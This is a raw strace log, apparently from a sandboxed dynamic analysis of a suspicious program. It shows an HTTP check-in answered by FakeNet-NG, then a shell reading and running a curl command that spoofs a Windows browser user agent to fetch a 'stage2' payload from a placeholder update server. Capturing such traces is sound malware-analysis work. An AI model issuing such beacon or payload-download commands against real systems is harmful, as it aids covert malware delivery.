22    10:07:55.853222 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, 8) = 0
22    10:07:55.853819 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, NULL, 8) = 0
22    10:07:55.854359 poll([{fd=5<socket:[77480]>, events=POLLPRI|POLLOUT|POLLWRNORM}], 1, 0) = 0 (Timeout)
22    10:07:55.854901 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, NULL, 8) = 0
22    10:07:55.855409 poll([{fd=5<socket:[77480]>, events=POLLOUT}, {fd=3<pipe:[77477]>, events=POLLIN}], 2, 7) = 1 ([{fd=5, revents=POLLOUT}])
22    10:07:55.858338 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, 8) = 0
22    10:07:55.858995 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, NULL, 8) = 0
22    10:07:55.859499 poll([{fd=5<socket:[77480]>, events=POLLPRI|POLLOUT|POLLWRNORM}], 1, 0) = 1 ([{fd=5, revents=POLLOUT|POLLWRNORM}])
22    10:07:55.860026 getsockopt(5<socket:[77480]>, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
22    10:07:55.860702 getsockname(5<socket:[77480]>, {sa_family=AF_INET, sin_port=htons(47342), sin_addr=inet_addr("172.19.0.2")}, [128 => 16]) = 0
22    10:07:55.861376 getpeername(5<socket:[77480]>, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("192.0.2.123")}, [128 => 16]) = 0
22    10:07:55.861864 getsockname(5<socket:[77480]>, {sa_family=AF_INET, sin_port=htons(47342), sin_addr=inet_addr("172.19.0.2")}, [128 => 16]) = 0
22    10:07:55.862282 getpeername(5<socket:[77480]>, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("192.0.2.123")}, [128 => 16]) = 0
22    10:07:55.862703 getsockname(5<socket:[77480]>, {sa_family=AF_INET, sin_port=htons(47342), sin_addr=inet_addr("172.19.0.2")}, [128 => 16]) = 0
22    10:07:55.863234 sendto(5<socket:[77480]>, "GET /api/v1/checkin HTTP/1.1\r\nHo"..., 167, MSG_NOSIGNAL, NULL, 0) = 167
22    10:07:55.863701 poll([{fd=5<socket:[77480]>, events=POLLIN|POLLPRI|POLLRDNORM|POLLRDBAND}], 1, 0) = 0 (Timeout)
22    10:07:55.864179 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, NULL, 8) = 0
22    10:07:55.864598 poll([{fd=5<socket:[77480]>, events=POLLIN}, {fd=3<pipe:[77477]>, events=POLLIN}], 2, 0) = 0 (Timeout)
22    10:07:55.865017 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, 8) = 0
22    10:07:55.865585 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, NULL, 8) = 0
22    10:07:55.866228 poll([{fd=5<socket:[77480]>, events=POLLIN|POLLPRI|POLLRDNORM|POLLRDBAND}], 1, 0) = 0 (Timeout)
22    10:07:55.866873 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, NULL, 8) = 0
22    10:07:55.867470 poll([{fd=5<socket:[77480]>, events=POLLIN}, {fd=3<pipe:[77477]>, events=POLLIN}], 2, 1000) = 1 ([{fd=5, revents=POLLIN}])
22    10:07:55.875455 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, 8) = 0
22    10:07:55.876263 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, NULL, 8) = 0
22    10:07:55.876951 poll([{fd=5<socket:[77480]>, events=POLLIN|POLLPRI|POLLRDNORM|POLLRDBAND}], 1, 0) = 1 ([{fd=5, revents=POLLIN|POLLRDNORM}])
22    10:07:55.877626 recvfrom(5<socket:[77480]>, "HTTP/1.0 200 OK\r\nServer: FakeNet"..., 102400, 0, NULL, NULL) = 1535
22    10:07:55.878289 fstat(1<pipe:[78065]>, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
22    10:07:55.878955 close(5<socket:[77480]>) = 0
22    10:07:55.879527 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, NULL, 8) = 0
22    10:07:55.880206 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, NULL, 8) = 0
22    10:07:55.880843 write(1<pipe:[78065]>, "<html>\n<head>\n<title>FakeNet-NG<"..., 1411) = 1411
22    10:07:55.881493 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, 8) = 0
22    10:07:55.882183 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, NULL, 8) = 0
22    10:07:55.882773 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, 8) = 0
22    10:07:55.883320 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, NULL, 8) = 0
22    10:07:55.883885 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, NULL, 8) = 0
22    10:07:55.884463 close(3<pipe:[77477]>) = 0
22    10:07:55.885038 close(4<pipe:[77477]>) = 0
22    10:07:55.885607 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, NULL, 8) = 0
22    10:07:55.886123 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, 8) = 0
22    10:07:55.886624 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, NULL, 8) = 0
22    10:07:55.887132 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, NULL, 8) = 0
22    10:07:55.887640 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, 8) = 0
22    10:07:55.888223 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, NULL, 8) = 0
22    10:07:55.888734 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7c3d3b154330}, NULL, 8) = 0
22    10:07:55.889760 exit_group(0)     = ?
22    10:07:55.891857 +++ exited with 0 +++
9     10:07:55.892150 <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 22
9     10:07:55.892481 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=0x5dc4659d8750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.893097 ioctl(2<pipe:[78066]>, TIOCGWINSZ, 0x7ffe4bfa9910) = -1 ENOTTY (Inappropriate ioctl for device)
9     10:07:55.893635 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     10:07:55.894118 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=22, si_uid=1001, si_status=0, si_utime=0, si_stime=2 /* 0.02 s */} ---
9     10:07:55.894372 wait4(-1, 0x7ffe4bfa9290, WNOHANG, NULL) = 0
9     10:07:55.894851 rt_sigreturn({mask=[]}) = 0
9     10:07:55.895348 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.895843 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.896394 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.896890 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.897389 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.897885 read(0<pipe:[79132]>, "u", 1) = 1
9     10:07:55.898377 read(0<pipe:[79132]>, "r", 1) = 1
9     10:07:55.898975 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:55.899531 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.900289 read(0<pipe:[79132]>, "-", 1) = 1
9     10:07:55.900872 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.901378 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.901850 read(0<pipe:[79132]>, "-", 1) = 1
9     10:07:55.902329 read(0<pipe:[79132]>, "A", 1) = 1
9     10:07:55.902823 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.903366 read(0<pipe:[79132]>, "\"", 1) = 1
9     10:07:55.903961 read(0<pipe:[79132]>, "M", 1) = 1
9     10:07:55.904525 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.905028 read(0<pipe:[79132]>, "z", 1) = 1
9     10:07:55.905537 read(0<pipe:[79132]>, "i", 1) = 1
9     10:07:55.906029 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:55.906520 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:55.907046 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.907710 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:55.908402 read(0<pipe:[79132]>, "5", 1) = 1
9     10:07:55.909041 read(0<pipe:[79132]>, ".", 1) = 1
9     10:07:55.909532 read(0<pipe:[79132]>, "0", 1) = 1
9     10:07:55.909999 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.910522 read(0<pipe:[79132]>, "(", 1) = 1
9     10:07:55.911029 read(0<pipe:[79132]>, "W", 1) = 1
9     10:07:55.911535 read(0<pipe:[79132]>, "i", 1) = 1
9     10:07:55.912039 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:55.912604 read(0<pipe:[79132]>, "d", 1) = 1
9     10:07:55.913117 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.913648 read(0<pipe:[79132]>, "w", 1) = 1
9     10:07:55.914261 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.914810 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.915323 read(0<pipe:[79132]>, "N", 1) = 1
9     10:07:55.915830 read(0<pipe:[79132]>, "T", 1) = 1
9     10:07:55.916437 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.916983 read(0<pipe:[79132]>, "1", 1) = 1
9     10:07:55.917491 read(0<pipe:[79132]>, "0", 1) = 1
9     10:07:55.917991 read(0<pipe:[79132]>, ".", 1) = 1
9     10:07:55.918491 read(0<pipe:[79132]>, "0", 1) = 1
9     10:07:55.918994 read(0<pipe:[79132]>, ";", 1) = 1
9     10:07:55.919498 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.920001 read(0<pipe:[79132]>, "W", 1) = 1
9     10:07:55.920584 read(0<pipe:[79132]>, "i", 1) = 1
9     10:07:55.921098 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:55.921600 read(0<pipe:[79132]>, "6", 1) = 1
9     10:07:55.922105 read(0<pipe:[79132]>, "4", 1) = 1
9     10:07:55.922609 read(0<pipe:[79132]>, ";", 1) = 1
9     10:07:55.923112 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.923617 read(0<pipe:[79132]>, "x", 1) = 1
9     10:07:55.924205 read(0<pipe:[79132]>, "6", 1) = 1
9     10:07:55.924901 read(0<pipe:[79132]>, "4", 1) = 1
9     10:07:55.925508 read(0<pipe:[79132]>, ")", 1) = 1
9     10:07:55.926164 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.926679 read(0<pipe:[79132]>, "A", 1) = 1
9     10:07:55.927198 read(0<pipe:[79132]>, "p", 1) = 1
9     10:07:55.927703 read(0<pipe:[79132]>, "p", 1) = 1
9     10:07:55.928248 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:55.928746 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.929265 read(0<pipe:[79132]>, "W", 1) = 1
9     10:07:55.929781 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.930289 read(0<pipe:[79132]>, "b", 1) = 1
9     10:07:55.930843 read(0<pipe:[79132]>, "K", 1) = 1
9     10:07:55.931376 read(0<pipe:[79132]>, "i", 1) = 1
9     10:07:55.931912 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.932471 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:55.933039 read(0<pipe:[79132]>, "5", 1) = 1
9     10:07:55.933705 read(0<pipe:[79132]>, "3", 1) = 1
9     10:07:55.934239 read(0<pipe:[79132]>, "7", 1) = 1
9     10:07:55.934762 read(0<pipe:[79132]>, ".", 1) = 1
9     10:07:55.935365 read(0<pipe:[79132]>, "3", 1) = 1
9     10:07:55.935910 read(0<pipe:[79132]>, "6", 1) = 1
9     10:07:55.936429 read(0<pipe:[79132]>, "\"", 1) = 1
9     10:07:55.936927 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.937420 read(0<pipe:[79132]>, "-", 1) = 1
9     10:07:55.937917 read(0<pipe:[79132]>, "-", 1) = 1
9     10:07:55.938425 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.938934 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.939440 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:55.939951 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:55.940499 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.941000 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.941670 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.942251 read(0<pipe:[79132]>, "-", 1) = 1
9     10:07:55.942960 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.943473 read(0<pipe:[79132]>, "i", 1) = 1
9     10:07:55.944002 read(0<pipe:[79132]>, "m", 1) = 1
9     10:07:55.944535 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.945028 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.945511 read(0<pipe:[79132]>, "u", 1) = 1
9     10:07:55.946037 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.946506 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.947011 read(0<pipe:[79132]>, "5", 1) = 1
9     10:07:55.947516 read(0<pipe:[79132]>, " ", 1) = 1
9     10:07:55.948024 read(0<pipe:[79132]>, "\"", 1) = 1
9     10:07:55.948585 read(0<pipe:[79132]>, "h", 1) = 1
9     10:07:55.949090 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.949661 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.950451 read(0<pipe:[79132]>, "p", 1) = 1
9     10:07:55.951076 read(0<pipe:[79132]>, ":", 1) = 1
9     10:07:55.951779 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:55.952324 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:55.952812 read(0<pipe:[79132]>, "u", 1) = 1
9     10:07:55.953311 read(0<pipe:[79132]>, "p", 1) = 1
9     10:07:55.953812 read(0<pipe:[79132]>, "d", 1) = 1
9     10:07:55.954318 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.954821 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.955321 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.955823 read(0<pipe:[79132]>, "-", 1) = 1
9     10:07:55.956409 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.957029 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.957558 read(0<pipe:[79132]>, "r", 1) = 1
9     10:07:55.958314 read(0<pipe:[79132]>, "v", 1) = 1
9     10:07:55.959032 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.959697 read(0<pipe:[79132]>, "r", 1) = 1
9     10:07:55.960303 read(0<pipe:[79132]>, "-", 1) = 1
9     10:07:55.960850 read(0<pipe:[79132]>, "p", 1) = 1
9     10:07:55.961345 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:55.961830 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.962353 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.962853 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.963353 read(0<pipe:[79132]>, "h", 1) = 1
9     10:07:55.963854 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.964436 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:55.964941 read(0<pipe:[79132]>, "d", 1) = 1
9     10:07:55.965442 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.965943 read(0<pipe:[79132]>, "r", 1) = 1
9     10:07:55.966554 read(0<pipe:[79132]>, ".", 1) = 1
9     10:07:55.967196 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:55.967824 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.968404 read(0<pipe:[79132]>, "c", 1) = 1
9     10:07:55.968893 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.969396 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:55.969894 read(0<pipe:[79132]>, "/", 1) = 1
9     10:07:55.970394 read(0<pipe:[79132]>, "d", 1) = 1
9     10:07:55.970889 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.971376 read(0<pipe:[79132]>, "w", 1) = 1
9     10:07:55.971874 read(0<pipe:[79132]>, "n", 1) = 1
9     10:07:55.972449 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:55.972974 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.973468 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.973957 read(0<pipe:[79132]>, "d", 1) = 1
9     10:07:55.974451 read(0<pipe:[79132]>, "?", 1) = 1
9     10:07:55.974946 read(0<pipe:[79132]>, "p", 1) = 1
9     10:07:55.975439 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.975926 read(0<pipe:[79132]>, "y", 1) = 1
9     10:07:55.976444 read(0<pipe:[79132]>, "l", 1) = 1
9     10:07:55.976937 read(0<pipe:[79132]>, "o", 1) = 1
9     10:07:55.977455 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.977948 read(0<pipe:[79132]>, "d", 1) = 1
9     10:07:55.978494 read(0<pipe:[79132]>, "=", 1) = 1
9     10:07:55.979000 read(0<pipe:[79132]>, "s", 1) = 1
9     10:07:55.979496 read(0<pipe:[79132]>, "t", 1) = 1
9     10:07:55.979995 read(0<pipe:[79132]>, "a", 1) = 1
9     10:07:55.980492 read(0<pipe:[79132]>, "g", 1) = 1
9     10:07:55.980991 read(0<pipe:[79132]>, "e", 1) = 1
9     10:07:55.981490 read(0<pipe:[79132]>, "2", 1) = 1
9     10:07:55.981988 read(0<pipe:[79132]>, "\"", 1) = 1
9     10:07:55.982513 read(0<pipe:[79132]>, "\n", 1) = 1
9     10:07:55.983189 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     10:07:55.983847 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD], [], 8) = 0
9     10:07:55.984469 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7201ca25fe50) = 24
9     10:07:55.985635 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
24    10:07:55.985922 set_robust_list(0x7201ca25fe60, 24 <unfinished ...>
9     10:07:55.986138 <... rt_sigprocmask resumed>NULL, 8) = 0
24    10:07:55.986365 <... set_robust_list resumed>) = 0
9     10:07:55.986611 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
24    10:07:55.986849 getpid( <unfinished ...>
9     10:07:55.987065 <... rt_sigprocmask resumed>[], 8) = 0
24    10:07:55.987304 <... getpid resumed>) = 24
9     10:07:55.987533 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
24    10:07:55.987770 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
9     10:07:55.987977 <... rt_sigprocmask resumed>NULL, 8) = 0
24    10:07:55.988219 <... rt_sigprocmask resumed>NULL, 8) = 0
9     10:07:55.988426 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
24    10:07:55.988678 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330},  <unfinished ...>
9     10:07:55.988912 <... rt_sigprocmask resumed>[], 8) = 0
24    10:07:55.989137 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.989337 rt_sigaction(SIGINT, {sa_handler=0x5dc4659d8750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330},  <unfinished ...>
24    10:07:55.989557 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330},  <unfinished ...>
9     10:07:55.989759 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
24    10:07:55.989994 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
9     10:07:55.990197 wait4(-1,  <unfinished ...>
24    10:07:55.990406 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
24    10:07:55.991398 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
24    10:07:55.992235 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7201ca2a6330}, 8) = 0
24    10:07:55.992926 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7201ca2a6330}, {sa_handler=0x5dc4659d6230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7201ca2a6330}, 8) = 0
24    10:07:55.993638 execve("/usr/bin/curl", ["curl", "-s", "-A", "Mozilla/5.0 (Windows NT 10.0; Wi"..., "--connect-timeout", "5", "http://update-server-placeholder"...], 0x5dc497af3550 /* 8 vars */) = 0
24    10:07:56.002147 brk(NULL)         = 0x5ef71bf79000
24    10:07:56.005836 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x77bfe9ed0000
24    10:07:56.007896 openat(AT_FDCWD</sandbox>, "/lib/libfake_tracer.so", O_RDONLY|O_CLOEXEC) = 3</usr/lib/libfake_tracer.so>
24    10:07:56.010418 read(3</usr/lib/libfake_tracer.so>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.011598 fstat(3</usr/lib/libfake_tracer.so>, {st_mode=S_IFREG|0755, st_size=16376, ...}) = 0
24    10:07:56.012749 mmap(NULL, 19160, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0) = 0x77bfe9ecb000
24    10:07:56.013673 mmap(0x77bfe9ecc000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x1000) = 0x77bfe9ecc000
24    10:07:56.014595 mmap(0x77bfe9ecd000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x77bfe9ecd000
24    10:07:56.015429 mmap(0x77bfe9ece000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x77bfe9ece000
24    10:07:56.016139 close(3</usr/lib/libfake_tracer.so>) = 0
24    10:07:56.016764 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
24    10:07:56.017327 openat(AT_FDCWD</sandbox>, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3</etc/ld.so.cache>
24    10:07:56.017946 fstat(3</etc/ld.so.cache>, {st_mode=S_IFREG|0644, st_size=7295, ...}) = 0
24    10:07:56.025144 mmap(NULL, 7295, PROT_READ, MAP_PRIVATE, 3</etc/ld.so.cache>, 0) = 0x77bfe9ec9000
24    10:07:56.028504 close(3</etc/ld.so.cache>) = 0
24    10:07:56.030344 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libcurl.so.4", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>
24    10:07:56.031763 read(3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.033356 fstat(3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>, {st_mode=S_IFREG|0644, st_size=786336, ...}) = 0
24    10:07:56.034489 mmap(NULL, 789456, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>, 0) = 0x77bfe9e08000
24    10:07:56.035519 mmap(0x77bfe9e19000, 573440, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>, 0x11000) = 0x77bfe9e19000
24    10:07:56.036277 mmap(0x77bfe9ea5000, 118784, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>, 0x9d000) = 0x77bfe9ea5000
24    10:07:56.036991 mmap(0x77bfe9ec2000, 28672, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>, 0xb9000) = 0x77bfe9ec2000
24    10:07:56.037907 close(3</usr/lib/x86_64-linux-gnu/libcurl.so.4.8.0>) = 0
24    10:07:56.038702 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libz.so.1", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libz.so.1.3>
24    10:07:56.041054 read(3</usr/lib/x86_64-linux-gnu/libz.so.1.3>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    10:07:56.041666 fstat(3</usr/lib/x86_64-linux-gnu/libz.so.1.3>, {st_mode=S_IFREG|0644, st_size=113000, ...}) = 0
24    10:07:56.042202 mmap(NULL, 110744, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libz.so.1.3>, 0) = 0x77bfe9dec000
24    10:07:56.042753 mmap(0x77bfe9dee000, 73728, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libz.so.1.3>, 0x2000) = 0x77bfe9dee000
